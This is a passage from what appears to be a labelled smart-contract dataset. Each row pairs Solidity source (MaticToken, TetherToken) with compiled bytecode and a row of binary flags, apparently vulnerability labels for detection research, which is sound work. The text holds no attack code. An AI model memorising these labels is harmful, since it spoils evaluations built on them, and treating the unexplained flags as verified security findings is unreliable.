0505481565b60006005547fea2aa0a1be11a07ed86d755c93467f4f82362b452371d1ba94d1715123511acb60001b8a8a8a8a8a604051602001808781526020018673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018481526020018381526020018215151515815260200196505050505050506040516020818303038152906040528051906020012060405160200180807f190100000000000000000000000000000000000000000000000000000000000081525060020183815260200182815260200192505050604051602081830303815290604052805190602001209050600073ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff16141561148c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260158152602001807f4461692f696e76616c69642d616464726573732d30000000000000000000000081525060200191505060405180910390fd5b60018185858560405160008152602001604052604051808581526020018460ff1660ff1681526020018381526020018281526020019450505050506020604051602081039080840390855afa1580156114e9573d6000803e3d6000fd5b5050506020604051035173ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff1614611593576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4461692f696e76616c69642d7065726d6974000000000000000000000000000081525060200191505060405180910390fd5b60008614806115a25750854211155b611614576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4461692f7065726d69742d65787069726564000000000000000000000000000081525060200191505060405180910390fd5b600460008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008154809291906001019190505587146116d6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f4461692f696e76616c69642d6e6f6e636500000000000000000000000000000081525060200191505060405180910390fd5b6000856116e4576000611706565b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5b905080600360008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508873ffffffffffffffffffffffffffffffffffffffff168a73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a350505050505050505050565b6040518060400160405280600381526020017f444149000000000000000000000000000000000000000000000000000000000081525081565b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054146118e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4461692f6e6f742d617574686f72697a6564000000000000000000000000000081525060200191505060405180910390fd5b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505961012081016040526020815260e0602082015260e0600060408301376024356004353360003560e01c60e01b61012085a45050565b80600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015611a16576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f4461692f696e73756666696369656e742d62616c616e6365000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614158015611aee57507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414155b15611cec5780600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015611be5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f4461692f696e73756666696369656e742d616c6c6f77616e636500000000000081525060200191505060405180910390fd5b611c6b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482611e77565b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b611d35600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482611e77565b600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550611d8460015482611e77565b600181905550600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b6000611e01338484610a25565b905092915050565b611e14338383610a25565b505050565b611e24838383610a25565b50505050565b60006020528060005260406000206000915090505481565b6003602052816000526040600020602052806000526040600020600091509150505481565b611e72823383610a25565b505050565b6000828284039150811115611e8b57600080fd5b92915050565b6000828284019150811015611ea557600080fd5b9291505056fea265627a7a72315820c0ae2c29860c0a59d5586a579abbcddfe4bcef0524a87301425cbc58c3e94e3164736f6c634300050c0032,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity 0.5.2;interface IERC20 { function transfer(address to, uint256 value) external returns (bool); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); function totalSupply() external view returns (uint256); function balanceOf(address who) external view returns (uint256); function allowance(address owner, address spender) external view returns (uint256); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0); uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a); uint256 c = a - b; return c; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a); return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b != 0); return a % b; }}contract ERC20 is IERC20 { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowed; uint256 private _totalSupply; function totalSupply() public view returns (uint256) { return _totalSupply; } function balanceOf(address owner) public view returns (uint256) { return _balances[owner]; } function allowance(address owner, address spender) public view returns (uint256) { return _allowed[owner][spender]; } function transfer(address to, uint256 value) public returns (bool) { _transfer(msg.sender, to, value); return true; } function approve(address spender, uint256 value) public returns (bool) { require(spender != address(0)); _allowed[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; } function transferFrom(address from, address to, uint256 value) public returns (bool) { _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value); _transfer(from, to, value); emit Approval(from, msg.sender, _allowed[from][msg.sender]); return true; } function increaseAllowance(address spender, uint256 addedValue) public returns (bool) { require(spender != address(0)); _allowed[msg.sender][spender] = _allowed[msg.sender][spender].add(addedValue); emit Approval(msg.sender, spender, _allowed[msg.sender][spender]); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) { require(spender != address(0)); _allowed[msg.sender][spender] = _allowed[msg.sender][spender].sub(subtractedValue); emit Approval(msg.sender, spender, _allowed[msg.sender][spender]); return true; } function _transfer(address from, address to, uint256 value) internal { require(to != address(0)); _balances[from] = _balances[from].sub(value); _balances[to] = _balances[to].add(value); emit Transfer(from, to, value); } function _mint(address account, uint256 value) internal { require(account != address(0)); _totalSupply = _totalSupply.add(value); _balances[account] = _balances[account].add(value); emit Transfer(address(0), account, value); } function _burn(address account, uint256 value) internal { require(account != address(0)); _totalSupply = _totalSupply.sub(value); _balances[account] = _balances[account].sub(value); emit Transfer(account, address(0), value); } function _burnFrom(address account, uint256 value) internal { _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(value); _burn(account, value); emit Approval(account, msg.sender, _allowed[account][msg.sender]); }}library Roles { struct Role { mapping (address => bool) bearer; } function add(Role storage role, address account) internal { require(account != address(0)); require(!has(role, account)); role.bearer[account] = true; } function remove(Role storage role, address account) internal { require(account != address(0)); require(has(role, account)); role.bearer[account] = false; } function has(Role storage role, address account) internal view returns (bool) { require(account != address(0)); return role.bearer[account]; }}contract PauserRole { using Roles for Roles.Role; event PauserAdded(address indexed account); event PauserRemoved(address indexed account); Roles.Role private _pausers; constructor () internal { _addPauser(msg.sender); } modifier onlyPauser() { require(isPauser(msg.sender)); _; } function isPauser(address account) public view returns (bool) { return _pausers.has(account); } function addPauser(address account) public onlyPauser { _addPauser(account); } function renouncePauser() public { _removePauser(msg.sender); } function _addPauser(address account) internal { _pausers.add(account); emit PauserAdded(account); } function _removePauser(address account) internal { _pausers.remove(account); emit PauserRemoved(account); }}contract Pausable is PauserRole { event Paused(address account); event Unpaused(address account); bool private _paused; constructor () internal { _paused = false; } function paused() public view returns (bool) { return _paused; } modifier whenNotPaused() { require(!_paused); _; } modifier whenPaused() { require(_paused); _; } function pause() public onlyPauser whenNotPaused { _paused = true; emit Paused(msg.sender); } function unpause() public onlyPauser whenPaused { _paused = false; emit Unpaused(msg.sender); }}contract ERC20Pausable is ERC20, Pausable { function transfer(address to, uint256 value) public whenNotPaused returns (bool) { return super.transfer(to, value); } function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) { return super.transferFrom(from, to, value); } function approve(address spender, uint256 value) public whenNotPaused returns (bool) { return super.approve(spender, value); } function increaseAllowance(address spender, uint addedValue) public whenNotPaused returns (bool success) { return super.increaseAllowance(spender, addedValue); } function decreaseAllowance(address spender, uint subtractedValue) public whenNotPaused returns (bool success) { return super.decreaseAllowance(spender, subtractedValue); }}contract ERC20Detailed is IERC20 { string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol, uint8 decimals) public { _name = name; _symbol = symbol; _decimals = decimals; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; }}contract MaticToken is ERC20Pausable, ERC20Detailed { constructor (string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public ERC20Detailed (name, symbol, decimals) { _mint(msg.sender, totalSupply); }}",0x608060405234801561001057600080fd5b5060043610610128576000357c0100000000000000000000000000000000000000000000000000000000900480635c975abb116100bf5780638456cb591161008e5780638456cb591461031057806395d89b4114610318578063a457c2d714610320578063a9059cbb1461034c578063dd62ed3e1461037857610128565b80635c975abb146102b45780636ef8d66d146102bc57806370a08231146102c457806382dc1ec4146102ea57610128565b8063313ce567116100fb578063313ce5671461023a57806339509351146102585780633f4ba83a1461028457806346fbf68e1461028e57610128565b806306fdde031461012d578063095ea7b3146101aa57806318160ddd146101ea57806323b872dd14610204575b600080fd5b6101356103a6565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561016f578181015183820152602001610157565b50505050905090810190601f16801561019c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101d6600480360360408110156101c057600080fd5b50600160a060020a03813516906020013561043c565b604080519115158252519081900360200190f35b6101f2610460565b60408051918252519081900360200190f35b6101d66004803603606081101561021a57600080fd5b50600160a060020a03813581169160208101359091169060400135610466565b61024261048c565b6040805160ff9092168252519081900360200190f35b6101d66004803603604081101561026e57600080fd5b50600160a060020a038135169060200135610495565b61028c6104b2565b005b6101d6600480360360208110156102a457600080fd5b5035600160a060020a0316610516565b6101d661052f565b61028c610538565b6101f2600480360360208110156102da57600080fd5b5035600160a060020a0316610543565b61028c6004803603602081101561030057600080fd5b5035600160a060020a031661055e565b61028c61057e565b6101356105e4565b6101d66004803603604081101561033657600080fd5b50600160a060020a038135169060200135610645565b6101d66004803603604081101561036257600080fd5b50600160a060020a038135169060200135610662565b6101f26004803603604081101561038e57600080fd5b50600160a060020a038135811691602001351661067f565b60058054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156104325780601f1061040757610100808354040283529160200191610432565b820191906000526020600020905b81548152906001019060200180831161041557829003601f168201915b5050505050905090565b60045460009060ff161561044f57600080fd5b61045983836106aa565b9392505050565b60025490565b60045460009060ff161561047957600080fd5b610484848484610728565b949350505050565b60075460ff1690565b60045460009060ff16156104a857600080fd5b61045983836107f1565b6104bb33610516565b15156104c657600080fd5b60045460ff1615156104d757600080fd5b6004805460ff191690556040805133815290517f5db9ee0a495bf2e6ff9c91a7834c1ba4fdd244a5e8aa4e537bd38aeae4b073aa9181900360200190a1565b600061052960038363ffffffff6108a116565b92915050565b60045460ff1690565b610541336108d8565b565b600160a060020a031660009081526020819052604090205490565b61056733610516565b151561057257600080fd5b61057b81610920565b50565b61058733610516565b151561059257600080fd5b60045460ff16156105a257600080fd5b6004805460ff191660011790556040805133815290517f62e78cea01bee320cd4e420270b5ea74000d11b0c9f74754ebdbfc544b05a2589181900360200190a1565b60068054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156104325780601f1061040757610100808354040283529160200191610432565b60045460009060ff161561065857600080fd5b6104598383610968565b60045460009060ff161561067557600080fd5b61045983836109b3565b600160a060020a03918216600090815260016020908152604080832093909416825291909152205490565b6000600160a060020a03831615156106c157600080fd5b336000818152600160209081526040808320600160a060020a03881680855290835292819020869055805186815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a350600192915050565b600160a060020a038316600090815260016020908152604080832033845290915281205461075c908363ffffffff6109c916565b600160a060020a038516600090815260016020908152604080832033845290915290205561078b8484846109de565b600160a060020a0384166000818152600160209081526040808320338085529083529281902054815190815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060019392505050565b6000600160a060020a038316151561080857600080fd5b336000908152600160209081526040808320600160a060020a038716845290915290205461083c908363ffffffff610aab16565b336000818152600160209081526040808320600160a060020a0389168085529083529281902085905580519485525191937f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a350600192915050565b6000600160a060020a03821615156108b857600080fd5b50600160a060020a03166000908152602091909152604090205460ff1690565b6108e960038263ffffffff610abd16565b604051600160a060020a038216907fcd265ebaf09df2871cc7bd4133404a235ba12eff2041bb89d9c714a2621c7c7e90600090a250565b61093160038263ffffffff610b0916565b604051600160a060020a038216907f6719d08c1888103bea251a4ed56406bd0c3e69723c8a1686e017e7bbe159b6f890600090a250565b6000600160a060020a038316151561097f57600080fd5b336000908152600160209081526040808320600160a060020a038716845290915290205461083c908363ffffffff6109c916565b60006109c03384846109de565b50600192915050565b6000828211156109d857600080fd5b50900390565b600160a060020a03821615156109f357600080fd5b600160a060020a038316600090815260208190526040902054610a1c908263ffffffff6109c916565b600160a060020a038085166000908152602081905260408082209390935590841681522054610a51908263ffffffff610aab16565b600160a060020a038084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b60008282018381101561045957600080fd5b600160a060020a0381161515610ad257600080fd5b610adc82826108a1565b1515610ae757600080fd5b600160a060020a0316600090815260209190915260409020805460ff19169055565b600160a060020a0381161515610b1e57600080fd5b610b2882826108a1565b15610b3257600080fd5b600160a060020a0316600090815260209190915260409020805460ff1916600117905556fea165627a7a72305820cce49a7abfc4bd1fcccf59df283bbf2975819bc0cd4e6f6755f46ea9411bdc650029,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0
"pragma solidity ^0.4.17;library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }}contract Ownable { address public owner; function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { if (newOwner != address(0)) { owner = newOwner; } }}contract ERC20Basic { uint public _totalSupply; function totalSupply() public constant returns (uint); function balanceOf(address who) public constant returns (uint); function transfer(address to, uint value) public; event Transfer(address indexed from, address indexed to, uint value);}contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public constant returns (uint); function transferFrom(address from, address to, uint value) public; function approve(address spender, uint value) public; event Approval(address indexed owner, address indexed spender, uint value);}contract BasicToken is Ownable, ERC20Basic { using SafeMath for uint; mapping(address => uint) public balances; uint public basisPointsRate = 0; uint public maximumFee = 0; modifier onlyPayloadSize(uint size) { require(!(msg.data.length < size + 4)); _; } function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) { uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(msg.sender, owner, fee); } Transfer(msg.sender, _to, sendAmount); } function balanceOf(address _owner) public constant returns (uint balance) { return balances[_owner]; }}contract StandardToken is BasicToken, ERC20 { mapping (address => mapping (address => uint)) public allowed; uint public constant MAX_UINT = 2**256 - 1; function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) { var _allowance = allowed[_from][msg.sender]; uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee > maximumFee) { fee = maximumFee; } if (_allowance < MAX_UINT) { allowed[_from][msg.sender] = _allowance.sub(_value); } uint sendAmount = _value.sub(fee); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(sendAmount); if (fee > 0) { balances[owner] = balances[owner].add(fee); Transfer(_from, owner, fee); } Transfer(_from, _to, sendAmount); } function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) { require(!((_value != 0) && (allowed[msg.sender][_spender] != 0))); allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); } function allowance(address _owner, address _spender) public constant returns (uint remaining) { return allowed[_owner][_spender]; }}contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; Pause(); } function unpause() onlyOwner whenPaused public { paused = false; Unpause(); }}contract BlackList is Ownable, BasicToken { function getBlackListStatus(address _maker) external constant returns (bool) { return isBlackListed[_maker]; } function getOwner() external constant returns (address) { return owner; } mapping (address => bool) public isBlackListed; function addBlackList (address _evilUser) public onlyOwner { isBlackListed[_evilUser] = true; AddedBlackList(_evilUser); } function removeBlackList (address _clearedUser) public onlyOwner { isBlackListed[_clearedUser] = false; RemovedBlackList(_clearedUser); } function destroyBlackFunds (address _blackListedUser) public onlyOwner { require(isBlackListed[_blackListedUser]); uint dirtyFunds = balanceOf(_blackListedUser); balances[_blackListedUser] = 0; _totalSupply -= dirtyFunds; DestroyedBlackFunds(_blackListedUser, dirtyFunds); } event DestroyedBlackFunds(address _blackListedUser, uint _balance); event AddedBlackList(address _user); event RemovedBlackList(address _user);}contract UpgradedStandardToken is StandardToken{ function transferByLegacy(address from, address to, uint value) public; function transferFromByLegacy(address sender, address from, address spender, uint value) public; function approveByLegacy(address from, address spender, uint value) public;}contract TetherToken is Pausable, StandardToken, BlackList { string public name; string public symbol; uint public decimals; address public upgradedAddress; bool public deprecated; function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public { _totalSupply = _initialSupply; name = _name; symbol = _symbol; decimals = _decimals; balances[owner] = _initialSupply; deprecated = false; } function transfer(address _to, uint _value) public whenNotPaused { require(!isBlackListed[msg.sender]); if (deprecated) { return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value); } else { return super.transfer(_to, _value); } } function transferFrom(address _from, address _to, uint _value) public whenNotPaused { require(!isBlackListed[_from]); if (deprecated) { return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value); } else { return super.transferFrom(_from, _to, _value); } } function balanceOf(address who) public constant returns (uint) { if (deprecated) { return UpgradedStandardToken(upgradedAddress).balanceOf(who); } else { return super.balanceOf(who); } } function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) { if (deprecated) { return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value); } else { return super.approve(_spender, _value); } } function allowance(address _owner, address _spender) public constant returns (uint remaining) { if (deprecated) { return StandardToken(upgradedAddress).allowance(_owner, _spender); } else { return super.allowance(_owner, _spender); } } function deprecate(address _upgradedAddress) public onlyOwner { deprecated = true; upgradedAddress = _upgradedAddress; Deprecate(_upgradedAddress); } function totalSupply() public constant returns (uint) { if (deprecated) { return StandardToken(upgradedAddress).totalSupply(); } else { return _totalSupply; } } function issue(uint amount) public onlyOwner { require(_totalSupply + amount > _totalSupply); require(balances[owner] + amount > balances[owner]); balances[owner] += amount; _totalSupply += amount; Issue(amount); } function redeem(uint amount) public onlyOwner { require(_totalSupply >= amount); require(balances[owner] >= amount); _totalSupply -= amount; balances[owner] -= amount; Redeem(amount); } function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner { require(newBasisPoints < 20); require(newMaxFee < 50); basisPointsRate = newBasisPoints; maximumFee = newMaxFee.mul(10**decimals); Params(basisPointsRate, maximumFee); } event Issue(uint amount); event Redeem(uint amount); event Deprecate(address newAddress); event Params(uint feeBasisPoints, uint maxFee);}",0x606060405260043610610196576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde031461019b5780630753c30c14610229578063095ea7b3146102625780630e136b19146102a45780630ecb93c0146102d157806318160ddd1461030a57806323b872dd1461033357806326976e3f1461039457806327e235e3146103e9578063313ce56714610436578063353907141461045f5780633eaaf86b146104885780633f4ba83a146104b157806359bf1abe146104c65780635c658165146105175780635c975abb1461058357806370a08231146105b05780638456cb59146105fd578063893d20e8146106125780638da5cb5b1461066757806395d89b41146106bc578063a9059cbb1461074a578063c0324c771461078c578063cc872b66146107b8578063db006a75146107db578063dd62ed3e146107fe578063dd644f721461086a578063e47d606014610893578063e4997dc5146108e4578063e5b5019a1461091d578063f2fde38b14610946578063f3bdc2281461097f575b600080fd5b34156101a657600080fd5b6101ae6109b8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101ee5780820151818401526020810190506101d3565b50505050905090810190601f16801561021b5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561023457600080fd5b610260600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610a56565b005b341561026d57600080fd5b6102a2600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610b73565b005b34156102af57600080fd5b6102b7610cc1565b604051808215151515815260200191505060405180910390f35b34156102dc57600080fd5b610308600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610cd4565b005b341561031557600080fd5b61031d610ded565b6040518082815260200191505060405180910390f35b341561033e57600080fd5b610392600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610ebd565b005b341561039f57600080fd5b6103a761109d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156103f457600080fd5b610420600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506110c3565b6040518082815260200191505060405180910390f35b341561044157600080fd5b6104496110db565b6040518082815260200191505060405180910390f35b341561046a57600080fd5b6104726110e1565b6040518082815260200191505060405180910390f35b341561049357600080fd5b61049b6110e7565b6040518082815260200191505060405180910390f35b34156104bc57600080fd5b6104c46110ed565b005b34156104d157600080fd5b6104fd600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506111ab565b604051808215151515815260200191505060405180910390f35b341561052257600080fd5b61056d600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611201565b6040518082815260200191505060405180910390f35b341561058e57600080fd5b610596611226565b604051808215151515815260200191505060405180910390f35b34156105bb57600080fd5b6105e7600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611239565b6040518082815260200191505060405180910390f35b341561060857600080fd5b610610611348565b005b341561061d57600080fd5b610625611408565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561067257600080fd5b61067a611431565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156106c757600080fd5b6106cf611456565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561070f5780820151818401526020810190506106f4565b50505050905090810190601f16801561073c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561075557600080fd5b61078a600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506114f4565b005b341561079757600080fd5b6107b6600480803590602001909190803590602001909190505061169e565b005b34156107c357600080fd5b6107d96004808035906020019091905050611783565b005b34156107e657600080fd5b6107fc600480803590602001909190505061197a565b005b341561080957600080fd5b610854600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611b0d565b6040518082815260200191505060405180910390f35b341561087557600080fd5b61087d611c52565b6040518082815260200191505060405180910390f35b341561089e57600080fd5b6108ca600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611c58565b604051808215151515815260200191505060405180910390f35b34156108ef57600080fd5b61091b600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611c78565b005b341561092857600080fd5b610930611d91565b6040518082815260200191505060405180910390f35b341561095157600080fd5b61097d600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611db5565b005b341561098a57600080fd5b6109b6600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611e8a565b005b60078054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610a4e5780601f10610a2357610100808354040283529160200191610a4e565b820191906000526020600020905b815481529060010190602001808311610a3157829003601f168201915b505050505081565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610ab157600080fd5b6001600a60146101000a81548160ff02191690831515021790555080600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507fcc358699805e9a8b7f77b522628c7cb9abd07d9efb86b6fb616af1609036a99e81604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a150565b604060048101600036905010151515610b8b57600080fd5b600a60149054906101000a900460ff1615610cb157600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663aee92d333385856040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050600060405180830381600087803b1515610c9857600080fd5b6102c65a03f11515610ca957600080fd5b505050610cbc565b610cbb838361200e565b5b505050565b600a60149054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610d2f57600080fd5b6001600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055507f42e160154868087d6bfdc0ca23d96a1c1cfa32f1b72ba9ba27b69b98a0d819dc81604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a150565b6000600a60149054906101000a900460ff1615610eb457600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318160ddd6000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b1515610e9257600080fd5b6102c65a03f11515610ea357600080fd5b505050604051805190509050610eba565b60015490505b90565b600060149054906101000a900460ff16151515610ed957600080fd5b600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151515610f3257600080fd5b600a60149054906101000a900460ff161561108c57600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638b477adb338585856040518563ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001945050505050600060405180830381600087803b151561107357600080fd5b6102c65a03f1151561108457600080fd5b505050611098565b6110978383836121ab565b5b505050565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60026020528060005260406000206000915090505481565b60095481565b60045481565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561114857600080fd5